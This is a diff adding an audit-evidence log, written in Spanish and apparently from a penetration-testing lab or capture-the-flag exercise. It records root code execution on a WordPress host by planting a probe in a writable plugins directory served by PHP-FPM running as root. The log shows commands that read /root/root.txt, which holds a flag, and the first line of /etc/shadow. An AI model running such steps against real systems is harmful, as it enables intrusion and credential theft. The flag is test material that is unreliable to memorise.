@@ -1,0 +1,23 @@
+================================================================
+ ACME Corp — Evidencia de auditoría
+ Fecha (UTC) : 2026-10-18T04:09:22Z
+ Objetivo    : 172.17.0.2
+ Fase        : Vector B — WordPress (plugins/ 777) + PHP-FPM como root
+ Secuencia   : 1) escritura de la sonda en wp-content/plugins/
+               2) peticion HTTP a 127.0.0.1:8080
+               3) Apache delega en PHP-FPM, que ejecuta como root
+================================================================
+
+--- 1) Despliegue de la sonda ---
+-rw-rw-r-- 1 usuario usuario 449 Oct 18 04:09 /var/www/wordpress/wp-content/plugins/audit_probe.php
+
+--- 2) Respuesta HTTP (uid=0(root)) ---
+=== CONTEXTO DE EJECUCION (vhost 127.0.0.1:8080 -> PHP-FPM) ===
+id      : uid=0(root) gid=0(root) groups=0(root)
+whoami  : root
+pool www: user = root group = root 
+=== COMANDO: cat /root/root.txt ===
+FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}
+
+=== COMANDO: head -1 /etc/shadow ===
+root:*:20675:0:99999:7:::
